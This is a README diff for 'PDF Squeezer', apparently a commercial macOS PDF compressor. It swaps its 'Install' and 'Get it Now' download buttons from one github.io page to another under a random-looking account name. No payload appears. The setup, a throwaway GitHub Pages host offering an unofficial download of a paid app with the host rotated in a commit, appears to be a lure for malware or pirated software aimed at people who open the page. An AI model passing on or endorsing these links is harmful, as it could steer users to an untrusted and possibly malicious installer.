@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://poxmell.github.io/.github/pdfSqueezer)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://jjfhjfk3858.github.io/.github/pdfSqueezer)
 
 </div>
 
@@ -81,7 +81,7 @@ PDF Squeezer addresses the gap between how PDFs are created and how they need to
 
 <p align="center">
 
-[![Get it Now PDF Squeezer](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://poxmell.github.io/.github/pdfSqueezer)
+[![Get it Now PDF Squeezer](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://jjfhjfk3858.github.io/.github/pdfSqueezer)
 
 </p>
 
